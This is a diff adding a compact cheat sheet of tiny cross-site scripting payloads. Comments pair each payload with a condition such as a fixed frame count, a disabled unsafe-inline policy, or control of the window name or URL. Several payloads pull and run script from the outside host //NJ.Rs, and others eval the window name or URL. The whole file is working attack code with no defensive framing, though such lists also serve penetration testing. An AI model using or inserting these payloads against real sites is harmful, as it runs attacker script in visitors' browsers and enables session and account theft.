@@ -1,0 +1,22 @@
+<? TINY XSS PAYLOADS ?>
+
+<!-- If the number of frames is constant -->
+<iframe/onload=src=top[0].name+/NJ.Rs/>
+
+<!-- If the number of frames is random -->
+<iframe/onload=src=contentWindow.name+/NJ.Rs/>
+
+<!-- If unsafe-inline is disabled in CSP -->
+<iframe/srcdoc="<script/src=//NJ.Rs></script>">
+
+<!-- Just casual script -->
+<script/src=//NJ.Rs></script>
+
+<!-- If you control the name of the window -->
+<iframe/onload=src=top.name>
+
+<!-- or in Firefox -->
+<svg/onload=eval(name)>
+
+<!-- If you control the URL -->
+<iframe/onload=eval(''+URL)>
